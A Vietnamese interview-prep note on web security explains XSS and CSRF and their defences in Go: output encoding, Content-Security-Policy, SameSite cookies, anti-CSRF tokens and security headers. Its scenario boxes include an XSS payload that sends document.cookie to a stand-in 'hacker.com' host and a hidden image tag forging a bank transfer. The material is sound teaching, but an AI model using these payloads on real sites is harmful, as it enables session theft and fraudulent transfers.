---
title: "Security - CSRF & XSS"
tags:
  - "security"
  - "xss"
  - "csrf"
  - "csp"
  - "headers"
  - "golang"
  - "interview"
  - "banking"
date: "2026-03-04"
author: "nathan.huynh"
summary: "XSS xảy ra khi App hiển thị dữ liệu user nhập vào (Input) mà không lọc, khiến trình duyệt hiểu nhầm dữ liệu đó là mã lệnh (Script)."
---

## 1. XSS (Cross-Site Scripting) - "Tiêm thuốc độc"
XSS xảy ra khi App hiển thị dữ liệu user nhập vào (Input) mà không lọc, khiến trình duyệt hiểu nhầm dữ liệu đó là mã lệnh (Script).

> [!DANGER] Kịch bản
> 
> Hacker comment vào bài viết: `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`
> 
> Khi user khác đọc bài viết đó -> Trình duyệt chạy đoạn script -> **Mất Session Cookie / Access Token.**

### Phòng thủ 1: Output Encoding (Context-aware)

Nguyên tắc: **Biến mọi thứ thành text vô hại.**
- Chuyển `<` thành `&lt;`
- Chuyển `>` thành `&gt;`
- **Trong Golang:** Gói `html/template` tự động làm việc này (Context-aware escaping).
    - _Lưu ý:_ Nếu dùng `template.HTML` (raw HTML) -> Bạn đang tắt chế độ bảo vệ -> Rất nguy hiểm.
### Phòng thủ 2: Content Security Policy (CSP) - "Cái Khiên Thần Thánh"

Đây là một **HTTP Header** giúp bạn lập danh sách trắng (Whitelist) các nguồn được phép chạy script.

HTTP

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://google-analytics.com
```

- `default-src 'self'`: Chỉ cho phép load tài nguyên từ chính domain của mình.
- `script-src ...`: Chỉ cho phép chạy JS từ domain mình và Google Analytics.
- **Inline Script bị chặn:** Đoạn `<script>alert(1)</script>` của hacker sẽ bị trình duyệt từ chối thực thi ngay lập tức vì vi phạm chính sách.
---

## 2. CSRF (Cross-Site Request Forgery) - "Mượn dao giết người"
Khác với XSS (Hacker chạy code), CSRF lừa trình duyệt của nạn nhân tự gửi request.

> [!DANGER] Kịch bản
> 
> 1. User đang đăng nhập `bank.com` (Cookie vẫn lưu trong browser).
>     
> 2. User lỡ tay bấm vào link `phim-moi-cuc-hot.com` (Web của Hacker).
>     
> 3. Web Hacker có đoạn code ẩn:
>     
>     `<img src="https://bank.com/transfer?to=hacker&amount=1000" width="0" height="0" />`
>     
> 4. Trình duyệt thấy thẻ `img` -> Tự động gửi GET request đến Bank kèm theo Cookie của User.
>     
> 5. Bank thấy Cookie hợp lệ -> **Chuyển tiền.**
>     

### Phòng thủ 1: SameSite Cookie (Chuẩn hiện đại)

Cấu hình Cookie để trình duyệt **KHÔNG** gửi cookie khi request đến từ domain khác.

Go

```
http.SetCookie(w, &http.Cookie{
    Name:     "session_token",
    Value:    "xyz",
    Path:     "/",
    HttpOnly: true,
    Secure:   true, // Bắt buộc HTTPS
    SameSite: http.SameSiteStrictMode, // HOẶC http.SameSiteLaxMode
})
```

- **Strict:** Cookie chỉ được gửi khi bạn đang ở chính trang `bank.com`. (An toàn nhất nhưng bất tiện nếu user bấm link từ email).
    
- **Lax (Mặc định):** Cho phép gửi cookie với các link điều hướng (User bấm link từ Facebook sang Bank vẫn giữ login), nhưng chặn các request ngầm (AJAX, Image, Iframe).
    

### Phòng thủ 2: Anti-CSRF Token (Synchronizer Token)

Dùng cho các hành động quan trọng (Chuyển tiền, Đổi pass).

1. Server sinh ra một chuỗi ngẫu nhiên (Token) và nhúng vào Form HTML (`<input type="hidden" value="token_123">`).
    
2. Khi User Submit, gửi kèm Token này lên.
    
3. Hacker bên trang web lạ không thể biết Token này là gì (vì Same Origin Policy không cho Hacker đọc trang web của Bank) -> Request giả mạo bị từ chối.
    

---

## 3. Các Header Bảo Mật Cần Thiết (Security Headers)

Trong Golang (dùng Gin/Fiber), bạn nên cài Middleware để set các header này cho **MỌI** response.

|**Header**|**Giá trị khuyến nghị**|**Tác dụng**|
|---|---|---|
|**Strict-Transport-Security (HSTS)**|`max-age=31536000; includeSubDomains`|Bắt buộc trình duyệt chỉ dùng HTTPS. Chống tấn công SSL Stripping (Hacker chặn giữa hạ cấp xuống HTTP).|
|**Content-Security-Policy (CSP)**|`default-src 'self'; ...`|Chống XSS (như đã nói ở trên).|
|**X-Content-Type-Options**|`nosniff`|Chặn trình duyệt "đoán mò" loại file. (Ví dụ: Hacker up file `avatar.jpg` nhưng nội dung là script -> Nếu không có header này, trình duyệt có thể chạy nó như JS).|
|**X-Frame-Options**|`DENY` hoặc `SAMEORIGIN`|Chống **Clickjacking**. Ngăn không cho trang web khác nhúng web của bạn vào `<iframe>` (để lừa user bấm nút ẩn).|
|**Referrer-Policy**|`strict-origin-when-cross-origin`|Kiểm soát việc lộ thông tin URL nguồn khi user bấm link sang trang khác.|
|**Permissions-Policy**|`geolocation=(), camera=()`|Chặn các tính năng nhạy cảm (Vị trí, Camera) nếu không cần thiết.|

---

## 4. Câu hỏi phỏng vấn thực chiến

> [!QUESTION] Q: `HttpOnly` Cookie có chống được XSS không?
> 
> **A:** **Không hoàn toàn.**
> 
> `HttpOnly` chỉ ngăn JavaScript đọc `document.cookie`.
> 
> -> Hacker không thể _ăn cắp_ cookie gửi về máy chủ của hắn.
> 
> -> NHƯNG Hacker vẫn có thể dùng XSS để thực hiện các hành động _thay mặt_ user (như gọi API chuyển tiền ngay trên trình duyệt nạn nhân).
> 
> -> **Kết luận:** `HttpOnly` giảm thiểu hậu quả, nhưng không chặn được XSS. Cần CSP và Input Sanitization.

> [!QUESTION] Q: Nếu tôi dùng JWT lưu trong LocalStorage, tôi có bị CSRF không?
> 
> **A:** **Về lý thuyết là Không.**
> 
> Vì LocalStorage không tự động gửi đi như Cookie. JS của bạn phải tự lấy token và nhét vào Header `Authorization`. Trang web của Hacker không thể đọc LocalStorage của bạn (Cross Domain) nên không thể giả mạo request.
> 
> -> **Tuy nhiên:** Lưu ở LocalStorage lại cực kỳ dễ bị **XSS** tấn công và trộm token.
> 
> -> _Best Practice:_ Lưu JWT trong **Cookie (HttpOnly + Secure + SameSite=Strict)**. Vừa chống XSS (không đọc được), vừa chống CSRF (nhờ SameSite).

> [!QUESTION] Q: Tại sao Postman gửi request không bị chặn CSRF hay CORS?
> 
> **A:**
> 
> Vì CSRF và CORS là cơ chế bảo vệ của **Trình duyệt (Browser)**.
> 
> Postman, cURL, hay Mobile App là các Client thô, chúng không tuân thủ các luật lệ này (không có khái niệm "Cross Domain" như trình duyệt). Security Headers chủ yếu bảo vệ Web User.

---
